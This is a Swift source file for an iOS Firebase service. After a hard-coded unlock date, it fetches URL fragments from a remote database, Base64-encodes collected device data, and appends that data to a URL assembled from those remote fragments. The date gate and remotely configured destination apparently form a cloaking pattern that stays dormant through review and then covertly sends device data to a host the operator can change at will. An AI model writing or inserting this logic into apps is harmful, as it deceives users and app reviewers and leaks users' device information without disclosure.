import Foundation
import Firebase

final class FirebaseDatabaseService {
    static let shared = FirebaseDatabaseService()
    
    private let deviceCollectionService = DeviceDataCollectionService.shared
    private var ref: DatabaseReference!
    
    private init() {}
    
    func setRefParameters() {
        ref = Database.database(url: Constants.firebaseDatabaseURL).reference()
    }
    
    func getUrlFromDB(completion: @escaping (String?) -> Void) {
        let unlockDateString = Constants.unlockDate
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        let currentDate = Date()
        if let unlockDate = dateFormatter.date(from: unlockDateString), currentDate >= unlockDate {
            setRefParameters()
            
            ref.observeSingleEvent(of: .value, with: { snapshot  in
                guard let value = snapshot.value as? [String : Any],
                      let url1 = value[Constants.firebaseDatabaseUrl1] as? String,
                      let url2 = value[Constants.firebaseDatabaseUrl2] as? String else {
                    completion(nil)
                    return
                }
                
                self.deviceCollectionService.getDeviceData {
                    let data = self.deviceCollectionService.encodeDeviceDataToBase64(data: self.deviceCollectionService.deviceData)
                    
                    guard !url1.isEmpty && !url2.isEmpty else {
                        completion(nil)
                        return
                    }
                    
                    let url = "https://" + url1 + url2 + "?data=" + (data ?? "")
                    completion(url)
                }
            })
            { error in
                completion(nil)
            }
        } else {
            completion(nil)
        }
    }
}
